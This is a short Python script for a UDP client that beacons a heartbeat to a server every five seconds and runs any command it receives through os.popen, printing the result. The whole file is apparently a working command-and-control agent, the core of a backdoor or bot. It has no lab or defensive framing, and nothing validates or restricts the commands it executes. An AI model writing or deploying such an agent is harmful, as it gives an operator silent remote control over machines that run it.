import socket
import threading
import time
import os

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 6000


def heartbeat_thread(sock):
    while True:
        sock.sendto("HEARTBEAT".encode(), (SERVER_HOST, SERVER_PORT))
        time.sleep(5)


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    threading.Thread(target=heartbeat_thread, args=(sock,), daemon=True).start()

    print("[CLIENT] Heartbeat started. Waiting for server commands...")

    while True:
        data, _ = sock.recvfrom(1024)
        cmd = data.decode()

        if cmd == "NOOP":
            continue

        print(f"[CLIENT] Received command: {cmd}")

        if cmd.lower() == "exit":
            print("[CLIENT] Exit command received. Stopping client.")
            break

        # Execute command on client system
        output = os.popen(cmd).read()
        print(f"[CLIENT] Output:\n{output}")

    sock.close()


if __name__ == "__main__":
    main()
